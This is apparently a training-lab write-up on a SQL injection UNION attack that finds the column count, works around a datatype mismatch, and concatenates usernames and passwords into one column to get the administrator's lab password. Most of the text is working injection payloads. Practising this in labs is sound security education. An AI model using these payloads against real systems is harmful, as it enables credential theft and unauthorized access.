# Lab: SQL injection UNION attack, retrieving multiple values in a single column

**End Goal:** Perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the ```administrator``` user.

**Analysis**

*Check how many columns are there.*

' UNION SELECT NULL-- -

*Returns error*

' UNION SELECT NULL, NULL-- -

*Did not return errors so 2 columns in total.The database contains a different table called ```users```, with columns called ```username``` and ```password```.*

' UNION SELECT username, password FROM users-- -

*This returned error so maybe datatype mismatch.*

' UNION SELECT NULL, password FROM users-- -

*It worked when I tried this which means that I need to show both username and password in the second column.*


' UNION SELECT NULL, username || '~' || password FROM users-- -


**Answer:** 

administrator~z1en6sqw09a4nzlxctz9

